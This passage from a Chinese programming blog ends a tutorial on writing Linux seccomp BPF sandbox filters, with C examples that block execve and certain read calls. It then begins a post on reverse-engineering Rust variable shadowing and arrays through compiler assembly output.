*</span></span><br><span class="line"><span class="comment"> * The ordering ensures that a min_t() over composed return values always</span></span><br><span class="line"><span class="comment"> * selects the least permissive choice.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL_PROCESS 0x80000000U <span class="comment">/* kill the process */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL_THREAD	 0x00000000U <span class="comment">/* kill the thread */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_KILL	 SECCOMP_RET_KILL_THREAD</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_TRAP	 0x00030000U <span class="comment">/* disallow and force a SIGSYS */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ERRNO	 0x00050000U <span class="comment">/* returns an errno */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_USER_NOTIF	 0x7fc00000U <span class="comment">/* notifies userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_TRACE	 0x7ff00000U <span class="comment">/* pass to a tracer or disallow */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_LOG		 0x7ffc0000U <span class="comment">/* allow after logging */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ALLOW	 0x7fff0000U <span class="comment">/* allow */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Masks for the return value sections. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ACTION_FULL	0xffff0000U</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_ACTION	0x7fff0000U</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_RET_DATA	0x0000ffffU</span></span><br></pre></td></tr></table></figure>
<p>上面定义了seccomp BPF的返回值，从注释可知，返回值的低16bit用于传递其他数据，高16bit用于传递返回值的优先级。当一个系统调用匹配了多个seccomp规则时，会优先使用优先级高的返回值，这里从<code>SECCOMP_RET_KILL_PROCESS</code>的优先级最高，<code>SECCOMP_RET_ALLOW</code>最低，如果一个系统调用匹配了两个规则，返回值分别为<code>SECCOMP_RET_KILL</code>和<code>SECCOMP_RET_ALLOW</code>，那么最终将会选择<code>SECCOMP_RET_KILL</code>作为返回值，即杀死触发这个系统调用的线程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct seccomp_data - the format the BPF program executes over.</span></span><br><span class="line"><span class="comment"> * @nr: the system call number</span></span><br><span class="line"><span class="comment"> * @arch: indicates system call convention as an AUDIT_ARCH_* value</span></span><br><span class="line"><span class="comment"> *        as defined in &lt;linux/audit.h&gt;.</span></span><br><span class="line"><span class="comment"> * @instruction_pointer: at the time of the system call.</span></span><br><span class="line"><span class="comment"> * @args: up to 6 system call arguments always stored as 64-bit values</span></span><br><span class="line"><span class="comment"> *        regardless of the architecture.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> nr;</span><br><span class="line">	__u32 arch;</span><br><span class="line">	__u64 instruction_pointer;</span><br><span class="line">	__u64 args[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面这段代码定义了一些编写seccomp BPF code可能会用到的东西，根据注释可知，我们可以在BPF code中获取该系统调用的：系统调用号、处理器架构、指令地址、6个参数的值。具体选择获取什么通过字段k来决定，k相当于<code>seccomp_data</code>结构体的偏移量，若指定<code>k=0</code>，则为获取<code>nr</code>，即系统调用号，若<code>k=4</code>，则为获取处理器架构等。</p>
<p>我们以一个实例对seccomp BPF code进行理解，尝试通过机器码恢复code本身。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  LD | ABS | Word, R0 = arch</span><br><span class="line"> 0001: 0x15 0x00 0x19 0xc000003e  JMP | JEQ after 0x19, R0 == AUDIT_ARCH_X86_64 ?</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  LD | ABS | Word, R0 = nr</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  JMP | JGE after 0x01, R0 &gt;= 0x40000000 ?</span><br><span class="line"> 0004: 0x15 0x00 0x16 0xffffffff  JMP | JEQ after 0x16, R0 == 0xFFFFFFFF ?</span><br><span class="line"> 0005: 0x15 0x15 0x00 0x00000000  JMP | JEQ after 0x15, R0 == 0 ?</span><br><span class="line"> 0006: 0x15 0x14 0x00 0x00000001  JMP | JEQ after 0x14, R0 == 1 ?</span><br><span class="line"> 0007: 0x15 0x13 0x00 0x00000002  JMP | JEQ after 0x13, R0 == 2 ?</span><br><span class="line"> ...</span><br><span class="line"> 0026: 0x06 0x00 0x00 0x7fff0000  return SECCOMP_RET_ALLOW</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x00000000  return SECCOMP_RET_KILL</span><br></pre></td></tr></table></figure>
<p>注意第二行的K字段，这里的K指的是<code>AUDIT_ARCH_X86_64</code>，定义于<code>/include/uapi/linux/audit.h</code>，其中为所有架构都定义了独特的标识符，而0xc000003e则是<code>AUDIT_ARCH_X86_64</code>的值。对于整个seccomp code而言，可能需要的外部数据也就只有<code>seccomp_data</code>了。</p>
<p>下面，我们就来通过一些具体的程序示例巩固一下我们的学习成果，使用seccomp BPF code完成自定义的filter规则。</p>
<h2 id="实例"><a class="markdownIt-Anchor" href="#实例"></a> 实例</h2>
<h3 id="task-01"><a class="markdownIt-Anchor" href="#task-01"></a> Task 01</h3>
<p>实现seccomp BPF filter，过滤x86-64之外所有架构的所有系统调用，过滤execve。</p>
<p>实现代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, arch)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, AUDIT_ARCH_X86_64, <span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        BPF_STMT(BPF_ALU | BPF_K | BPF_SUB, <span class="number">59</span>),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sock_filter)),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);</span><br><span class="line">    system(<span class="string">&quot;echo HELLO&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码实现了对处理器架构与execve的检查，使用了一个<code>ALU</code>类型指令将系统调用号减去59，随后与0相比较。</p>
<p>对于seccomp BPF code而言，使用一个寄存器实际上已经足够了，对于多个返回值，我们可以在BPF code的最后几行进行统一定义，在编写前面的代码时，由于跳转指令的数量不确定，有时可能需要预留跳转数，在code编写完成后再进行计算。而对于seccomp的多个检查，我们完全可以将code除了返回之外的所有代码分片看待，每一片都进行一个检查，不同分片之间互不影响，每个分片中只使用一个寄存器即可完成检查，因此总的seccomp BPF code也只需要一个寄存器即可实现，这就使得我们不需要了解所有的BPF指令即可完美编写seccomp BPF filter。</p>
<p>在加载seccomp规则之前，代码中还执行了一次<code>prctl</code>。这里引用<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273495.htm#msg_header_h1_2">参考资料</a>：</p>
<blockquote>
<p>PR_SET_NO_NEW_PRIVS()：是在Linux 3.5 之后引入的特性，当一个进程或者子进程设置了PR_SET_NO_NEW_PRIVS 属性,则其不能访问一些无法共享的操作，如setuid、chroot等。配置seccomp-BPF的程序必须拥有Capabilities 中 的CAP_SYS_ADMIN，或者程序已经定义了no_new_privs属性。 若不这样做 非 root 用户使用该程序时 seccomp保护将会失效，设置了 PR_SET_NO_NEW_PRIVS 位后能保证 seccomp 对所有用户都能起作用</p>
</blockquote>
<h3 id="task-02"><a class="markdownIt-Anchor" href="#task-02"></a> Task 02</h3>
<p>实现seccomp BPF filter，过滤x86-64之外所有架构的所有系统调用，不允许第一个参数为3的read系统调用。</p>
<p>实现代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, arch)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, AUDIT_ARCH_X86_64, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, args[<span class="number">0</span>])),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sock_filter)),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/bin/ls&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, fd);</span><br><span class="line">    read(fd, buffer, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意<code>BPF_JUMP</code>宏定义的使用，后面的2个参数分别表示条件成立时跳过前面几条指令，条件不成立时跳过前面几条指令。在上面的代码中，首先判断处理器架构，如果不是x86_64则跳转到<code>KILL</code>，随后首先判断系统调用号是不是3，不是则跳转到<code>ALLOW</code>，是则继续执行，判断第一个参数是不是3，如果是则跳转到<code>KILL</code>。</p>
<h1 id="0x03-总结"><a class="markdownIt-Anchor" href="#0x03-总结"></a> 0x03. 总结</h1>
<p>本文简要分析了seccomp添加规则的流程，以及seccomp BPF的编写方法。</p>
<p>在后面的文章中，我们将尝试尽可能分析CTF pwn题中所有与seccomp有关的绕过姿势，并通过具体的示例进行学习。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/27/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/27/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">Rust逆向学习 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-27 18:18:15" itemprop="dateCreated datePublished" datetime="2023-10-27T18:18:15+08:00">2023-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-11-10 14:42:05" itemprop="dateModified" datetime="2023-11-10T14:42:05+08:00">2023-11-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>7.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在本文中，我们将跟随《Rust权威指南》的学习路线，继续进行Rust逆向的学习。</p>
<p>前两篇文章中，我们对猜数字这个程序进行了详细的逆向分析，学习了Rust元组、枚举类型、控制结构、函数调用规则等基础的Rust汇编语言层结构。本文将针对第3章——通用编程概念与第4章——认识所有权的部分内容，对书中提到的Rust特性进行逆向分析。一方面学习逆向，另一方面深入理解Rust语言本身。</p>
<h1 id="reverse-for-shadow"><a class="markdownIt-Anchor" href="#reverse-for-shadow"></a> Reverse for Shadow</h1>
<p>Rust逆向中有一个“隐藏”（Shadow）的概念。它指的是一个变量可以多次被<code>let</code>关键字修饰，第二次通过<code>let</code>关键字定义变量可以改变原变量的类型，或改变原变量的值。如书中的示例：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x * <span class="number">2</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如此通过<code>let</code>关键字改变变量，与直接将变量用<code>mut</code>关键字声明的区别是可以在改变变量值的情况下保证变量的不可变性，还能够修改变量的类型。那么对于汇编语言层而言，在不改变变量类型的情况下，shadow特性是否会修改变量的保存位置？如果修改了变量类型，Rust又会将新的变量保存到什么位置呢？</p>
<h2 id="0x01-变量类型不修改"><a class="markdownIt-Anchor" href="#0x01-变量类型不修改"></a> 0x01. 变量类型不修改</h2>
<p>在没有修改变量类型的情况下，我们使用下面的代码示例进行测试：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x); </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, x, y); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里每行语句的内容以及顺序是笔者通过调试选择的。</p>
<p>如果没有第一句<code>println!</code>语句，5这个值将会被保存到<code>eax</code>之中而不是一开始保存到内存，随后首先计算5+2将7保存到内存中某个位置。然后代码中通过<code>mov eax, 5</code>再将5赋值给x，计算5+1将6保存到内存中另一个位置。这是Rust编译器优化的结果，减少了内存交互。</p>
<p>而如果将第一个<code>println!</code>语句加上，情况则大不相同。因为根据我们前面文章的分析，<code>println!</code>需要首先获取若干个指针将第一个参数字符串中的中括号内容进行替换，因此在执行第一句<code>println!</code>前，<code>x</code>这个值必须要被保存到内存之中。使用网站编译后获取的部分汇编代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 216</span><br><span class="line">        mov     dword ptr [rsp + 12], 5</span><br><span class="line">        lea     rax, [rsp + 12]</span><br><span class="line">        mov     qword ptr [rsp + 200], rax</span><br><span class="line">        mov     rax, qword ptr [rip + core::fmt::num::imp::&lt;impl core::fmt::Display for i32&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 208], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 200]</span><br><span class="line">        mov     rax, qword ptr [rsp + 208]</span><br><span class="line">        mov     qword ptr [rsp + 64], rcx</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_4]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 64]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        mov     eax, dword ptr [rsp + 12]</span><br><span class="line">        add     eax, 2</span><br><span class="line">        mov     dword ptr [rsp + 8], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_2</span><br><span class="line">        mov     eax, dword ptr [rsp + 8]</span><br><span class="line">        mov     dword ptr [rsp + 80], eax</span><br><span class="line">        mov     eax, dword ptr [rsp + 12]</span><br><span class="line">        inc     eax</span><br><span class="line">        mov     dword ptr [rsp + 4], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_4</span><br><span class="line">        jmp     .LBB1_3</span><br></pre></td></tr></table></figure>
<p>可以看到，5这个值首先被保存到了<code>[rsp+12]</code>这个地方。在输出后从这个地方取出值，+2，保存到<code>[rsp+8]</code>作为y。下面的<code>seto</code>指令指的是如果该指令执行时将溢出标志位（OF）的值保存到唯一一个操作数，也就是<code>al</code>中，这个主要是为了检查整数运算是否产生了数值溢出。</p>
<p>最后一部分，可以看到<code>eax</code>取出<code>[rsp+12]</code>这个地址的内容，+1，再保存到了另外一个地址空间<code>[rsp+4]</code>中。也就是说，这里Rust编译器选择不复用原来的内存空间，即使原来的内存空间在正常情况下已经不会再被访问。这造成了4字节的内存空间浪费。上述的代码是以无优化模式进行编译，没有进行优化。</p>
<p>不过当笔者在编译选项中添加<code>-C opt-level=3</code>，即最高级别优化时，具体的汇编代码虽然有所不同，原先的整数计算将不再进行溢出检查，但是<code>x</code>在shadow之后依然被保存到了不同的内存空间之中。</p>
<h2 id="0x02-变量类型修改"><a class="markdownIt-Anchor" href="#0x02-变量类型修改"></a> 0x02. 变量类型修改</h2>
<p>当变量类型修改时，有三种情况可能产生：新的变量类型占用的内存空间大小不变或更大或更小。</p>
<p>将上一节Rust代码中第二次使用<code>let</code>关键字定义的变量<code>x</code>从<code>i32</code>类型改变为<code>u32</code>类型，最终保存变量的内存空间排布与上一节完全相同，唯一不同的是溢出检查变成了<code>setb</code>命令，这个命令相当于是将进位/借位标志位赋值给寄存器，也就是检查无符号整数溢出的。</p>
<p>将上一节中的shadow变量<code>x</code>从<code>i32</code>类型改为<code>i16</code>类型，即将变量占用的内存空间变小，最终的结果依然是不会复用。改为<code>i64</code>类型也是如此。</p>
<p>由此可以得出结论：<strong>Rust中一个变量将另一个变量隐藏后，无论新的变量类型是什么，都不会使用原来的变量内存空间保存新的变量。</strong></p>
<p>另外，当旧值为一个对象实例时，隐藏旧值后旧值将会自动删除。</p>
<p>经过思考，笔者认为Rust编译器这样做的原因是：有的时候一个变量将另一个变量隐藏时，新赋的值可能需要旧值参与运算。如果旧值为指针，那么此时新值不可能复用旧值的内存空间，旧值需要在新值赋值运算进行过程中一直保持不变，因此不复用内存空间在编译器设计上反而是最为简单的。另外，旧值在被隐藏后生命周期不会立即结束，针对其的引用依然能够使用，不过如果其所有权没有被夺走，隐藏后就无法获取其所有权了。</p>
<h1 id="reverse-for-array"><a class="markdownIt-Anchor" href="#reverse-for-array"></a> Reverse for Array</h1>
<p>Rust语言中有数组结构，对于数组的定义，Rust有较为方便的定义方式。当需要连续多个相同的值到相邻的数组索引时，可以使用分号定义，如<code>[5;5]</code>即为长度为5，5个索引值全为5的数组。</p>
<p>下面是<code>let x = [5; 10]</code>的反编译：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        xor     eax, eax</span><br><span class="line">        mov     qword ptr [rsp - 48], rax</span><br><span class="line">.LBB0_1:</span><br><span class="line">        mov     rax, qword ptr [rsp - 48]</span><br><span class="line">        mov     qword ptr [rsp - 56], rax</span><br><span class="line">        cmp     rax, 10</span><br><span class="line">        jae     .LBB0_3</span><br><span class="line">        mov     rax, qword ptr [rsp - 56]</span><br><span class="line">        mov     dword ptr [rsp + 4*rax - 40], 5</span><br><span class="line">        add     rax, 1</span><br><span class="line">        mov     qword ptr [rsp - 48], rax</span><br><span class="line">        jmp     .LBB0_1</span><br><span class="line">.LBB0_3:</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到这里使用了一个循环结构来为各个索引赋值，而且经过测试发现，即使分号后面是2，Rust也会使用循环来定义。当优化等级为最高时，Rust编译器会通过<code>xmmword</code>赋值，一次可以赋值4个索引16个字节的内容。</p>
<h1 id="reverse-for-moving"><a class="markdownIt-Anchor" href="#reverse-for-moving"></a> Reverse for Moving</h1>
